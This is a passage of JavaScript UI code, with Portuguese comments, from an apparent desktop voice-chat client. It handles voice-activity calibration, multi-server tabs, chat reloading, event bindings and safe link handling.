    $('sbPlaying').textContent = state.audio.soundboardPlaying ? 'tocando…' : '';

    $('statusText').textContent = on ? 'Conectado como ' + (state.self.nickname || '?')
      : state.status === 'connecting' ? 'Conectando…'
      : state.status === 'reconnecting' ? 'Reconectando' + (state.reconnectAttempt ? ' (tentativa ' + Number(state.reconnectAttempt) + ')' : '') + '…'
      : 'Desconectado';
    $('statusError').textContent = state.status === 'disconnected' || state.status === 'reconnecting' ? state.error : '';
    renderWhisper();
    renderSettings(false);
    if (bookmarkDlg) bookmarkDlg.refresh();
    $('statusSignal').classList.toggle('off', !on);
    updateChatInput();
    renderMeter();
  }

  // renderFloor mostra a sensibilidade da detecção de voz e o que a calibração
  // está fazendo (ou acabou de fazer).
  function renderFloor(shown) {
    const floor = Math.round(Number(state.audio.vadFloor) || 0);
    if (Date.now() > floorBusyUntil) {
      $('vadFloorSlider').value = String(Math.round(floorPos(floor) * 1000));
      $('vadFloorValue').textContent = floor > 0 ? String(floor) : 'sem mínimo';
    }
    const busy = !!(calibration && calibration.timer);
    const btn = $('vadCalibrate');
    btn.disabled = busy;
    btn.textContent = busy ? 'Ouvindo… ' + calibration.left + ' s' : 'Calibrar com a minha voz';
    $('vadFloorSlider').disabled = busy;
    const hint = $('vadFloorHint');
    const note = calibration && !busy && Date.now() < calibration.until ? calibration : null;
    // A linha de texto só aparece durante a medida e logo depois dela; o que o
    // controle faz está na dica do rótulo.
    hint.hidden = !shown || !(busy || note);
    hint.classList.toggle('busy', busy);
    hint.classList.toggle('failed', !!(note && note.failed));
    hint.textContent = busy ? 'Fale normalmente. Nada é transmitido durante a medida.' : note ? note.text : '';
  }

  async function calibrateVoice() {
    if (calibration && calibration.timer) return;
    const tick = () => { calibration.left = Math.max(0, calibration.left - 1); renderFloor(true); };
    calibration = { left: CALIBRATION_SECONDS, timer: 0 };
    calibration.timer = setInterval(tick, 1000);
    renderFloor(true);
    let note;
    try {
      const res = await call('CalibrateVoice');
      note = { text: 'Sua voz ficou em ' + Math.round(res.voice) + '; o mínimo, em ' + Math.round(res.floor) + '.', failed: false };
    } catch (e) {
      note = { text: errText(e), failed: true };
    }
    clearInterval(calibration.timer);
    floorBusyUntil = 0;
    calibration = Object.assign(note, { until: Date.now() + 12000 });
    renderChrome();
    setTimeout(() => { if (calibration === note) { calibration = null; renderChrome(); } }, 12100);
  }

  function renderMeter() {
    const level = talking.micLevel || 0;
    const byLevel = state.audio.vadMode === 'level';
    const open = !!talking.self || !!talking.tx || (byLevel && level >= state.audio.vadThreshold && !state.self.muted && level > 0);
    $('vadProb').textContent = Math.round(clamp(talking.voiceProb || 0, 0, 1) * 100) + '%';
    const fill = $('vadFill');
    fill.style.width = (level > 0 ? vadPos(level) * 100 : 0).toFixed(1) + '%';
    fill.classList.toggle('open', open);
    const gate = $('vadGate');
    gate.textContent = state.self.muted ? 'mutado' : open ? 'transmitindo' : 'fechado';
    gate.classList.toggle('open', open && !state.self.muted);
    // o que falamos vai para a aba do microfone, que pode não ser a que está à vista
    const here = talking.self && state.status === 'connected';
    const mic = micTab();
    const away = !here && talking.tx && !!mic && mic.id !== curTab;
    $('txIndicator').hidden = !(here || away);
    const txText = away ? 'Transmitindo em ' + tabName(mic) : 'Transmitindo';
    if ($('txText').textContent !== txText) $('txText').textContent = txText;
  }

  // ------------------------------------------------------------------ abas de servidores
  // Cada servidor conectado é uma aba. O backend manda o estado inteiro só da
  // aba à vista (state.tab) e um resumo de todas (state.tabs). Aqui fica o que
  // é da interface em cada aba — seleção, canais recolhidos, conversas abertas,
  // rascunho —, guardado ao sair dela e reposto ao voltar; o bate-papo é
  // remontado com as mensagens da aba.
  const tabUI = new Map();     // id da aba → o que foi guardado dela
  let curTab = 0;              // a aba que a interface mostra (0 = nenhuma ainda)
  let wantTab = 0;             // a aba pedida por último, enquanto o backend não confirma
  let chatEpoch = 0;           // muda a cada troca: resposta de GetMessages de uma troca anterior é descartada
  let chatLoading = true;      // o bate-papo está sendo (re)montado: o que chega espera em chatQueue
  let chatQueue = [];
  let talkingTabs = new Set(); // abas em que alguém está falando
  let stabsHtml = '';
  let scriptTabsSig = '';      // a última lista de abas entregue aos scripts
  const STATUS_TEXT = { connected: 'conectado', connecting: 'conectando…', reconnecting: 'reconectando…', disconnected: 'desconectado' };

  // callOn chama a API numa aba específica; call (acima) age na que está à vista.
  const callOn = (tab, name, ...args) => { try { return Promise.resolve(bridge.forTab(tab)[name](...args)); } catch (e) { return Promise.reject(e); } };
  const tabName = (t) => (t ? t.name || t.host || 'Nova aba' : '');
  const findTab = (id) => state.tabs.find((t) => t.id === id);
  const micTab = () => state.tabs.find((t) => t.mic);

  function renderServerTabs() {
    const bar = $('serverTabs');
    const list = state.tabs;
    bar.hidden = list.length < 2;
    bar.classList.toggle('many', list.length >= 6);
    const html = bar.hidden ? '' : list.map((t) => {
      const name = tabName(t);
      const tip = name + (t.host && t.host !== name ? ' (' + t.host + ')' : '') + ' — ' + STATUS_TEXT[t.status];
      return `<button type="button" class="stab st-${t.status}${t.id === curTab ? ' active' : ''}${t.unread ? ' unread' : ''}${t.silenced ? ' silenced' : ''}" role="tab" aria-selected="${t.id === curTab}" data-stab="${t.id}" title="${esc(tip)}">` +
        '<span class="stab-dot"></span>' +
        `<span class="stab-label">${esc(name)}</span>` +
        (t.silenced ? `<span class="stab-mark" title="Servidor silenciado: você não ouve esta aba">${icon('spk-s')}</span>` : '') +
        (t.unread ? `<span class="badge" title="Mensagens não lidas">${t.unread > 99 ? '99+' : t.unread}</span>` : '') +
        (t.mic ? `<span class="stab-mic on" title="Você fala neste servidor">${icon('mic')}</span>`
          : t.status !== 'disconnected' ? `<span class="stab-mic" data-mic="${t.id}" title="Falar neste servidor">${icon('mic')}</span>` : '') +
        `<span class="stab-close" data-close="${t.id}" title="Fechar aba">${icon('x')}</span>` +
        '</button>';
    }).join('');
    if (html !== stabsHtml) { stabsHtml = html; bar.innerHTML = html; }
    applyTabTalking();
  }

  // acende a bolinha das abas em que alguém fala e o microfone da aba em que transmitimos
  function applyTabTalking() {
    $('serverTabs').querySelectorAll('.stab').forEach((el) => {
      el.classList.toggle('talking', talkingTabs.has(Number(el.dataset.stab)));
      const mic = el.querySelector('.stab-mic.on');
      if (mic) mic.classList.toggle('tx', !!talking.tx);
    });
  }

  // Barra de estado: com mais de uma aba, diz em que servidor está o microfone.
  function renderMicWhere() {
    const el = $('micWhere');
    const list = state.tabs;
    const mic = micTab();
    let text = '', cls = '', tip = '';
    if (list.length >= 2) {
      if (mic && mic.status !== 'disconnected') {
        if (mic.id === curTab) { text = 'Microfone neste servidor'; tip = 'O que você fala vai para este servidor.'; }
        else {
          text = 'Microfone em ' + tabName(mic) + (mic.status === 'connected' ? '' : ' (' + STATUS_TEXT[mic.status] + ')');
          cls = 'elsewhere';
          tip = 'Você fala em "' + tabName(mic) + '", não neste servidor.' + (state.status !== 'disconnected' ? ' Clique para falar aqui.' : '');
        }
      } else if (list.some((t) => t.status === 'connected')) {
        text = 'Microfone sem servidor: escolha a aba em que quer falar';
        cls = 'none';
        tip = 'Ninguém ouve você agora.' + (state.status !== 'disconnected' ? ' Clique para falar neste servidor.' : '');
      }
    }
    el.hidden = !text;
    const html = icon('mic') + '<span>' + esc(text) + '</span>';
    if (el.dataset.html !== html) { el.dataset.html = html; el.innerHTML = html; }
    el.className = 'mic-where' + (cls ? ' ' + cls : '');
    el.title = tip;
  }

  function serverTabMenu(t) {
    return [
      { label: 'Falar neste servidor', checked: t.mic, disabled: t.mic || t.status === 'disconnected', action: () => setMicTab(t.id) },
      { label: t.silenced ? 'Voltar a ouvir este servidor' : 'Silenciar este servidor', action: () => callOn(t.id, 'SetTabSilenced', !t.silenced).catch((e) => localLine('error', errText(e))) },
      { sep: true },
      { label: 'Fechar aba', action: () => closeServerTab(t.id) },
    ];
  }

  function setMicTab(id) {
    callOn(id, 'SetMicTab').catch((e) => localLine('error', errText(e)));
  }

  // Troca a aba à vista. Com um diálogo aberto não se troca: ele é da aba atual.
  function switchServerTab(id) {
    if (!id || openModals.length || !findTab(id) || id === (wantTab || curTab)) return;
    wantTab = id;
    callOn(id, 'SelectTab').then((st) => {
      if (wantTab !== id) return; // já pediram outra aba depois desta
      wantTab = 0;
      if (st && Number(st.tab) === id) onState(st);
    }, (e) => { if (wantTab === id) wantTab = 0; localLine('error', errText(e)); });
  }
  function stepServerTab(dir) {
    const list = state.tabs;
    if (list.length < 2) return;
    const i = list.findIndex((t) => t.id === (wantTab || curTab));
    switchServerTab(list[(i + dir + list.length) % list.length].id);
  }

  async function closeServerTab(id) {
    const t = findTab(id);
    if (!t || openModals.length) return;
    if (t.status !== 'disconnected') {
      const ok = await askConfirm({ title: 'Fechar aba', text: 'Sair do servidor "' + tabName(t) + '" e fechar a aba?', okLabel: 'Fechar aba' });
      if (!ok) return;
    }
    callOn(id, 'CloseTab').catch((e) => localLine('error', errText(e)));
  }

  // Ctrl+Tab / Ctrl+Shift+Tab: próxima aba / anterior; Cmd (ou Ctrl) + 1…9: a
  // aba nessa posição. Um atalho do usuário com a mesma combinação tem preferência.
  function serverTabKey(e) {
    const list = state.tabs;
    if (list.length < 2 || openModals.length) return false;
    let step = 0, to = 0;
    if (e.key === 'Tab' && e.ctrlKey && !e.altKey && !e.metaKey) step = e.shiftKey ? -1 : 1;
    else if (/^Digit[1-9]$/.test(e.code) && !e.altKey && !e.shiftKey) {
      const mac = state.platform ? state.platform === 'darwin' : /Mac/i.test(navigator.platform || '');
      if (mac ? !e.metaKey || e.ctrlKey : !e.ctrlKey || e.metaKey) return false;
      const hk = state.hotkeys || {}, combo = comboFromEvent(e);
      if ([hk.ptt, hk.toggleMute, hk.toggleDeafen, hk.soundStop].includes(combo) || (state.audio.sounds || []).some((x) => x.hotkey === combo)) return false;
      const t = list[Number(e.code.slice(5)) - 1];
      if (!t) return false;
      to = t.id;
    } else return false;
    e.preventDefault();
    e.stopPropagation();
    if (!e.repeat) { if (step) stepServerTab(step); else switchServerTab(to); }
    return true;
  }

  // ---- o que é da interface em cada aba
  function saveTabUI() {
    if (!curTab) return;
    tabUI.set(curTab, {
      selection, userSelected, collapsed: Array.from(collapsed), prevStatus,
      activeChat: activeTab,
      unread: { server: tabs.get('server').unread, channel: tabs.get('channel').unread },
      privates: tabOrder.map((k) => tabs.get(k)).filter((t) => t.kind === 'private').map((t) => ({ peerId: t.peerId, label: t.label, unread: t.unread })),
      draft: $('chatInput').value,
      lastMsg: lastMsgId,
    });
  }

  // leaveTab roda com o estado da aba antiga ainda em vigor.
  function leaveTab() {
    saveTabUI();
    closePopover();
    // o bate-papo da aba antiga sai da tela
    for (const key of tabOrder.slice()) {
      const t = tabs.get(key);
      if (t.kind !== 'private') continue;
      t.view.remove();
      tabs.delete(key);
      tabOrder.splice(tabOrder.indexOf(key), 1);
    }
    for (const t of tabs.values()) { t.view.textContent = ''; t.unread = 0; t.stick = true; t.top = 0; t.hasHist = false; t.histSep = false; }
    seenIds.clear();
    lastMsgId = 0;
    talkingSet = new Set();
    talking = Object.assign({}, talking, { clients: [], self: false });
  }

  // enterTab roda já com o estado da aba nova.
  function enterTab() {
    const ui = tabUI.get(curTab);
    selection = ui ? ui.selection : null;
    userSelected = ui ? ui.userSelected : false;
    collapsed.clear();
    if (ui) ui.collapsed.forEach((id) => collapsed.add(id));
    // aba vista pela primeira vez: não é "conexão nova", é só a primeira visita
    prevStatus = ui ? ui.prevStatus : state.status;
    if (ui) {
      ui.privates.forEach((p) => { createTab('p:' + p.peerId, 'private', p.peerId, p.label).unread = p.unread || 0; });
      tabs.get('server').unread = ui.unread.server || 0;
      tabs.get('channel').unread = ui.unread.channel || 0;
    }
    activeTab = ui && tabs.has(ui.activeChat) ? ui.activeChat : 'server';
    for (const t of tabs.values()) t.view.hidden = t.key !== activeTab;
    $('chatInput').value = ui ? ui.draft || '' : '';
    // o que faltava num servidor pode existir no outro
    for (const [id, url] of iconCache) if (!url) iconCache.delete(id);
    iconTries.clear();
    avatarCache.forEach((url, key) => { if (!url) avatarCache.delete(key); });
    infoHoldUntil = 0;
    renderTabs();
    loadChat(curTab, ui);
  }

  // Remonta o bate-papo da aba com as mensagens que o backend guarda dela. O
  // que chega enquanto isso espera em chatQueue, para entrar na ordem certa; se
  // a pessoa trocar de aba de novo antes da resposta, a resposta é descartada.
  function loadChat(id, ui) {
    const epoch = ++chatEpoch;
    chatLoading = true;
    chatQueue = [];
    const seen = ui ? ui.lastMsg || 0 : Infinity; // até onde a pessoa já tinha visto (primeira visita: nada conta como novo)
    callOn(id, 'GetMessages').catch(() => []).then((list) => {
      if (epoch !== chatEpoch) return;
      (Array.isArray(list) ? list : []).forEach((m) => {
        if (!m || (m.tab && m.tab !== id)) return;
        const old = !(m.id > seen);
        if (old && ui && m.targetMode === 1 && !tabs.has('p:' + m.peerId)) return; // conversa privada que já tinha sido fechada
        appendMessage(m, old);
      });
      chatLoading = false;
      const queued = chatQueue;
      chatQueue = [];
      queued.forEach((m) => appendMessage(m, false));
      activateTab(tabs.has(activeTab) ? activeTab : 'server');
    });
  }

  function onMessage(m) {
    if (!m || (m.tab && curTab && m.tab !== curTab)) return; // de uma aba fora da vista: o backend conta como não lida
    if (chatLoading) chatQueue.push(m);
    else appendMessage(m, false);
  }

  // O resumo das abas mudou (com ou sem o estado inteiro).
  function tabsChanged() {
    const ids = new Set(state.tabs.map((t) => t.id));
    for (const id of Array.from(tabUI.keys())) if (!ids.has(id)) tabUI.delete(id); // aba fechada
    for (const t of state.tabs) {
      // a conexão caiu com a aba fora da vista: ao voltar a ela, vale como conexão nova
      const ui = t.id !== curTab && t.status !== 'connected' ? tabUI.get(t.id) : null;
      if (ui) ui.prevStatus = t.status;
    }
    // os scripts rodam uma vez para cada servidor: precisam saber quais abas existem
    const sig = state.tabs.map((t) => t.id + ':' + tabName(t)).join('|');
    if (sig !== scriptTabsSig && window.FuritoScripts.setTabs) {
      scriptTabsSig = sig;
      window.FuritoScripts.setTabs(state.tabs.map((t) => ({ id: t.id, name: tabName(t) })));
    }
    renderServerTabs();
    renderMicWhere();
  }
  function onTabs(list) {
    state.tabs = normTabs(list);
    tabsChanged();
    renderMeter();
  }

  // ------------------------------------------------------------------ eventos do backend
  function onState(raw) {
    const next = normalize(raw);
    const switched = curTab !== 0 && next.tab !== 0 && next.tab !== curTab;
    if (switched) leaveTab();
    state = next;
    bridge.tab = state.tab; // os pedidos ao backend passam a dizer que são desta aba
    if (state.tab) curTab = state.tab;
    if (wantTab === curTab) wantTab = 0;
    if (switched) enterTab();
    if (state.status === 'connected' && prevStatus !== 'connected') {
      // nova conexão: ids de clientes antigos não valem mais
      for (const key of tabOrder.slice()) if (tabs.get(key).kind === 'private') closeTab(key);
      for (const [id, url] of iconCache) if (!url) iconCache.delete(id);
      iconTries.clear();
      avatarCache.forEach((url, key) => { if (!url) avatarCache.delete(key); }); // conexão nova: tenta de novo os avatares que falharam
    }
    if (state.audio.vadMode !== 'ptt') releasePTT();
    if (state.status !== 'connected') { talkingSet = new Set(); talking = { clients: [], self: false, tx: talking.tx, micLevel: talking.micLevel || 0, voiceProb: talking.voiceProb || 0 }; }
    prevStatus = state.status;
    window.FuritoScreen.onState(state);
    validateSelection();
    tabsChanged();
    renderTree();
    renderInfo();
    renderChrome();
    updateTabLabels();
    connectDialogOnState();
  }

  function onTalking(t) {
    t = t || {};
    talking = { clients: Array.isArray(t.clients) ? t.clients : [], self: !!t.self, tx: !!t.tx, micLevel: Number(t.micLevel) || 0, voiceProb: Number(t.voiceProb) || 0 };
    talkingSet = new Set(talking.clients);
    talkingTabs = new Set(Array.isArray(t.tabs) ? t.tabs.map(Number) : []);
    applyTalking();
    applyTabTalking();
    renderMeter();
  }

  function onMenu(action) {
    switch (action) {
      case 'connect': openConnectDialog(); break;
      case 'newTab': if (!openModals.length) openConnectDialog({ newTab: true }); break;
      case 'closeTab': closeServerTab(curTab); break;
      case 'nextTab': stepServerTab(1); break;
      case 'prevTab': stepServerTab(-1); break;
      case 'disconnect': run('Disconnect'); break;
      case 'toggleMute': run('ToggleMute'); break;
      case 'toggleDeafen': run('ToggleDeafen'); break;
      case 'toggleAway': toggleAway(); break;
      case 'settings': openSettings(); break;
      case 'about': openAbout(); break;
      case 'scripts': openScripts(); break;
      case 'bookmarks': openBookmarks(); break;
      default: break;
    }
  }

  // ------------------------------------------------------------------ ligações de UI
  function bindUI() {
    // barra de ferramentas
    $('tbConnect').addEventListener('click', openConnectDialog);
    $('tbDisconnect').addEventListener('click', () => run('Disconnect'));
    $('tbAway').addEventListener('click', toggleAway);
    $('tbBookmarks').addEventListener('click', () => {
      if (openPop && openPop.anchor === $('tbBookmarks')) closePopover(); else showMenu(bookmarksMenu(), $('tbBookmarks'));
    });
    $('whisperIndicator').addEventListener('click', () => run('SetWhisperTarget', ['', 0]));
    bindSettings();
    bindScreen();
    bindDialogDrag();
    $('tbMute').addEventListener('click', () => run('ToggleMute'));
    $('tbDeafen').addEventListener('click', () => run('ToggleDeafen'));
    $('tbRecord').addEventListener('click', () => run('ToggleRecording'));
    $('tbRecord').addEventListener('contextmenu', (e) => { e.preventDefault(); run('OpenRecordingsFolder'); });
    $('tbEffects').addEventListener('click', () => togglePopover($('popEffects'), $('tbEffects')));
    $('tbSoundboard').addEventListener('click', () => togglePopover($('popSoundboard'), $('tbSoundboard')));
    $('tbCapture').addEventListener('click', () => togglePopover($('popCapture'), $('tbCapture')));

    $('popEffects').addEventListener('click', (e) => {
      const b = e.target.closest('.menu-item');
      if (!b) return;
      if (b.dataset.action === 'mictest') { run('SetMicTest', [!state.audio.micTest]); return; }
      closePopover();
      run('SetEffect', [b.dataset.effect]);
    });
    $('popSoundboard').addEventListener('click', (e) => {
      const del = e.target.closest('.pad-del');
      if (del) { e.stopPropagation(); run('SoundboardRemove', [del.dataset.del]); return; }
      const keyBtn = e.target.closest('.pad-key');
      if (keyBtn) { e.stopPropagation(); soundHotkey(keyBtn.dataset.key); return; }
      if (e.target.closest('.pad-edit')) return;
      const b = e.target.closest('.pad');
      if (b) run('SoundboardPlay', [b.dataset.sound]);
    });
    $('popSoundboard').addEventListener('contextmenu', (e) => {
      const b = e.target.closest('.pad.custom');
      if (!b) return;
      e.preventDefault();
      e.stopPropagation();
      startRenameSound(b);
    });
    $('sbStop').addEventListener('click', () => run('SoundboardStop'));
    $('sbAdd').addEventListener('click', () => run('SoundboardAddFiles'));
    const sendSbVol = debounce((v) => run('SetSoundboardVolume', [v]), 60);
    $('sbVol').addEventListener('input', (e) => {
      sbVolBusyUntil = Date.now() + 700;
      sendSbVol(Number(e.target.value));
    });

    $('optNS').addEventListener('change', (e) => run('SetNoiseSuppression', [e.target.checked]));
    $('nsMode').addEventListener('change', (e) => run('SetNoiseMode', [e.target.value]));
    $('optAGC').addEventListener('change', (e) => run('SetAutoGain', [e.target.checked]));
    $('optAEC').addEventListener('change', (e) => run('SetEchoCancellation', [e.target.checked]));
    $('micModeBtn').addEventListener('click', () => run('ShowMicModes'));
    $('optNotify').addEventListener('change', (e) => run('SetNotifySounds', [e.target.checked]));
    $('notifyPack').addEventListener('change', (e) => run('SetNotifyPack', [e.target.value]));
    $('notifyImport').addEventListener('click', async () => {
      try {
        const n = Number(await call('ImportSoundPack')) || 0;
        if (n) localLine('success', n === 1 ? 'Pacote de sons importado.' : n + ' pacotes de sons importados.');
      } catch (e) { localLine('error', 'Importar pacote de sons: ' + errText(e)); }
    });
    $('optNormalize').addEventListener('change', (e) => run('SetNormalizeVoices', [e.target.checked]));
    $('optMicTest').addEventListener('change', (e) => run('SetMicTest', [e.target.checked]));
    document.querySelectorAll('input[name="vadMode"]').forEach((r) => {
      r.addEventListener('change', () => { if (r.checked) run('SetVADMode', [r.value]); });
    });

    const sendVad = debounce((v) => run('SetVADThreshold', [v]), 80);
    $('vadSlider').addEventListener('input', (e) => {
      const v = vadFromPos(Number(e.target.value) / 1000);
      vadBusyUntil = Date.now() + 700;
      $('vadValue').textContent = String(v);
      state.audio.vadThreshold = v;
      renderMeter();
      sendVad(v);
    });
    const sendFloor = debounce((v) => run('SetVADFloor', [v]), 80);
    $('vadFloorSlider').addEventListener('input', (e) => {
      const v = floorFromPos(Number(e.target.value) / 1000);
      floorBusyUntil = Date.now() + 700;
      $('vadFloorValue').textContent = v > 0 ? String(v) : 'sem mínimo';
      state.audio.vadFloor = v;
      sendFloor(v);
    });
    $('vadCalibrate').addEventListener('click', calibrateVoice);
    const sendVol = debounce((v) => run('SetOutputVolume', [v]), 60);
    $('volSlider').addEventListener('input', (e) => {
      volBusyUntil = Date.now() + 700;
      sendVol(Number(e.target.value));
    });

    // árvore
    const tree = $('tree');
    tree.addEventListener('mousedown', (e) => {
      if (e.button !== 0) return;
      const chev = e.target.closest('.chev');
      if (chev) {
        const id = Number(chev.dataset.id);
        if (collapsed.has(id)) collapsed.delete(id); else collapsed.add(id);
        renderTree();
        e.preventDefault();
        return;
      }
      const row = e.target.closest('.row');
      if (row) select(row.dataset.type, Number(row.dataset.id), true);
    });
    tree.addEventListener('dblclick', (e) => {
      if (e.target.closest('.chev')) return;
      const row = e.target.closest('.row');
      if (!row) return;
      const id = Number(row.dataset.id);
      if (row.dataset.type === 'channel') joinChannel(id);
      else if (row.dataset.type === 'client') openPrivateChat(id);
    });
    tree.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      if (state.status !== 'connected') return;
      const row = e.target.closest('.row');
      if (!row) { showContextMenu(e.clientX, e.clientY, serverMenu()); return; } // área vazia da árvore
      const type = row.dataset.type, id = Number(row.dataset.id);
      select(type, id, true);
      const target = type === 'channel' ? findChannel(id) : type === 'client' ? findClient(id) : null;
      if (type === 'server') showContextMenu(e.clientX, e.clientY, serverMenu());
      else if (target) showContextMenu(e.clientX, e.clientY, type === 'channel' ? channelMenu(target) : clientMenu(target));
    });
    tree.addEventListener('click', (e) => {
      if (e.target.closest('[data-act="cancel-reconnect"]')) run('Disconnect');
      const scr = e.target.closest('[data-act="watch-screen"]');
      const row = scr && scr.closest('.row');
      if (row) watchScreen(Number(row.dataset.id));
    });
    bindClientDrag(tree);

    // volume por pessoa no painel de informações
    const sendClientVol = debounce((id, v) => run('SetClientVolume', [id, v]), 60);
    $('info').addEventListener('input', (e) => {
      const slider = e.target.closest ? e.target.closest('.cl-vol') : null;
      if (!slider) return;
      infoHoldUntil = Date.now() + 700;
      const v = Number(slider.value);
      const pct = slider.parentElement.querySelector('.cl-vol-pct');
      if (pct) pct.textContent = v + '%';
      sendClientVol(Number(slider.dataset.client), v);
    });

    // abas de servidores
    const stabs = $('serverTabs');
    stabs.addEventListener('click', (e) => {
      const close = e.target.closest('[data-close]');
      if (close) { closeServerTab(Number(close.dataset.close)); return; }
      const mic = e.target.closest('[data-mic]');
      if (mic) { setMicTab(Number(mic.dataset.mic)); return; }
      const tab = e.target.closest('.stab');
      if (tab) switchServerTab(Number(tab.dataset.stab));
    });
    stabs.addEventListener('mousedown', (e) => { if (e.button === 1) e.preventDefault(); }); // o botão do meio fecha, não rola a página
    stabs.addEventListener('auxclick', (e) => {
      const tab = e.button === 1 ? e.target.closest('.stab') : null;
      if (tab) { e.preventDefault(); closeServerTab(Number(tab.dataset.stab)); }
    });
    stabs.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      const el = e.target.closest('.stab');
      const t = el ? findTab(Number(el.dataset.stab)) : null;
      if (t) showContextMenu(e.clientX, e.clientY, serverTabMenu(t));
    });
    $('micWhere').addEventListener('click', () => {
      const mic = micTab();
      if (state.status !== 'disconnected' && !(mic && mic.id === curTab)) setMicTab(curTab);
    });

    // abas e bate-papo
    $('tabBar').addEventListener('click', (e) => {
      const close = e.target.closest('[data-close]');
      if (close) { closeTab(close.dataset.close); return; }
      const tab = e.target.closest('.tab');
      if (tab) activateTab(tab.dataset.tab);
    });
    $('chatInput').addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && !e.isComposing) { e.preventDefault(); sendChat(); }
    });
    if (window.ResizeObserver) {
      new ResizeObserver(() => { const t = tabs.get(activeTab); if (t && t.stick) t.view.scrollTop = t.view.scrollHeight; }).observe($('chatViews'));
    }

    // emojis
    const EMOJIS = ['😀', '😂', '😅', '😉', '😎', '😍', '🤔', '😴', '😢', '😡', '🤯', '🥳', '👍', '👎', '👏', '🙏', '💪', '🔥', '❤️', '💀', '🎉', '🎮', '🎧', '☕'];
    $('emojiGrid').innerHTML = EMOJIS.map((em) => `<button type="button">${em}</button>`).join('');
    $('emojiBtn').addEventListener('click', () => togglePopover($('popEmoji'), $('emojiBtn')));
    $('emojiGrid').addEventListener('click', (e) => {
      const b = e.target.closest('button');
      if (!b) return;
      const input = $('chatInput');
      const s = input.selectionStart == null ? input.value.length : input.selectionStart;
      const en = input.selectionEnd == null ? input.value.length : input.selectionEnd;
      input.value = input.value.slice(0, s) + b.textContent + input.value.slice(en);
      closePopover();
      input.focus();
      input.setSelectionRange(s + b.textContent.length, s + b.textContent.length);
    });

    // diálogos
    $('connectForm').addEventListener('submit', (e) => { e.preventDefault(); submitConnect(); });
    $('connectCancel').addEventListener('click', () => {
      const abort = conn.requested && state.status === 'connecting';
      // a aba aberta por esta tentativa não fica para trás, vazia
      const mine = conn.newTab && conn.newTab === state.tab && (abort || state.status === 'disconnected') ? conn.newTab : 0;
      closeConnectDialog();
      if (mine) callOn(mine, 'CloseTab').catch(() => {});
      else if (abort) run('Disconnect');
    });
    $('passwordForm').addEventListener('submit', (e) => { e.preventDefault(); closePasswordDialog(true); });
    $('pwCancel').addEventListener('click', () => closePasswordDialog(false));

    // globais
    document.addEventListener('mousedown', (e) => {
      if (!openPop) return;
      if (openPop.el.contains(e.target) || (openPop.anchor && openPop.anchor.contains(e.target))) return;
      closePopover();
    }, true);
    // captura de atalho e atalhos com a janela em foco (fase de captura: antes de qualquer campo)
    document.addEventListener('keydown', (e) => {
      if (hkCapture) {
        e.preventDefault();
        e.stopPropagation();
        if (e.key === 'Escape') hkCapture.cancel();
        else if (e.code && !isModifierKey(e)) hkCapture.done(comboFromEvent(e));
        return;
      }
      if (serverTabKey(e)) return;
      onHotkeyDown(e);
    }, true);
    document.addEventListener('keyup', onHotkeyUp, true);
    window.addEventListener('blur', releasePTT);
    document.addEventListener('keydown', (e) => {
      if (e.key !== 'Escape') return;
      if (openPop) { closePopover(); return; }
      const top = openModals[openModals.length - 1];
      if (!top) return;
      if (top === $('dlgPassword')) closePasswordDialog(false);
      else if (top === $('dlgConnect')) $('connectCancel').click();
      else if (top._dismiss) top._dismiss();
    });
    // Links e imagens de textos escritos por outras pessoas. Nada aqui faz a
    // janela navegar: um endereço abre no navegador do sistema, e só se for
    // http/https (conferido de novo aqui, na hora do clique).
    const activate = (e) => {
      const el = e.target.closest ? e.target.closest('a, .img-ph') : null;
      if (!el) return false;
      if (el.matches('.img-ph')) {
        // o usuário pediu esta imagem: passa a carregar (nesta sessão)
        shownImages.add(el.dataset.img);
        infoHtml = null;
        renderInfo();
      } else if (el.dataset.act === 'img-trust' || el.dataset.act === 'img-untrust') {
        run('SetServerImages', [el.dataset.act === 'img-trust']);
      } else if (el.dataset.url) {
        const url = safeUrl(el.dataset.url);
        if (url) bridge.openURL(url);
      }
      e.preventDefault(); // inclusive para um <a href> que tenha escapado: a janela nunca navega
      return true;
    };
    document.addEventListener('click', activate);
    document.addEventListener('auxclick', (e) => { if (e.target.closest && e.target.closest('a')) e.preventDefault(); });
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && e.target.matches && e.target.matches('a.lnk')) activate(e);
    });
    document.addEventListener('contextmenu', (e) => {
      const t = e.target;
      const editable = t.closest && t.closest('input, textarea');
      const selectable = t.closest && t.closest('.chat-view, .info') && String(window.getSelection && window.getSelection()).length > 0;
      if (!editable && !selectable) e.preventDefault();
    });
    document.addEventListener('dragstart', (e) => e.preventDefault());
    window.addEventListener('blur', () => { if (!demoPinned) closePopover(); });
    window.addEventListener('resize', () => { if (!demoPinned) closePopover(); });

    initSplitters();
    setInterval(tickDurations, 1000);
  }

  function initSplitters() {
    const treePane = $('treePane'), bottom = $('bottomPane');
    const prefs = loadPrefs();
    if (prefs.treeW > 0) treePane.style.width = prefs.treeW + 'px';
    if (prefs.bottomH > 0) bottom.style.height = prefs.bottomH + 'px';

    function drag(handle, onMove, onEnd) {
      handle.addEventListener('pointerdown', (e) => {
        if (e.button !== 0) return;
        e.preventDefault();
        handle.setPointerCapture(e.pointerId);
        handle.classList.add('drag');
        const start = { x: e.clientX, y: e.clientY, treeW: treePane.offsetWidth, bottomH: bottom.offsetHeight };
        const move = (ev) => onMove(ev.clientX - start.x, ev.clientY - start.y, start);
        const up = () => {
          handle.classList.remove('drag');
          handle.removeEventListener('pointermove', move);
          handle.removeEventListener('pointerup', up);
          handle.removeEventListener('pointercancel', up);
          onEnd();
        };
        handle.addEventListener('pointermove', move);
        handle.addEventListener('pointerup', up);
        handle.addEventListener('pointercancel', up);
      });
    }
    drag($('splitV'),
      (dx, dy, s) => { treePane.style.width = clamp(s.treeW + dx, 160, Math.max(160, $('topSplit').clientWidth - 240)) + 'px'; },
      () => savePrefs({ treeW: treePane.offsetWidth }));
    drag($('splitH'),
      (dx, dy, s) => { bottom.style.height = clamp(s.bottomH - dy, 120, Math.max(120, window.innerHeight - 220)) + 'px'; },
      () => savePrefs({ bottomH: bottom.offsetHeight }));
  }

  function showBanner(text) {
    const b = $('banner');
    b.textContent = text;
    b.hidden = false;
  }

  // ==================================================================== recursos do dia a dia e de administração

  // ------------------------------------------------------------------ diálogos genéricos
  // Monta um diálogo modal (window.prompt/alert/confirm não existem no WKWebView).
  function openDialog(opts) {
    const el = document.createElement('div');
    el.className = 'modal dyn';
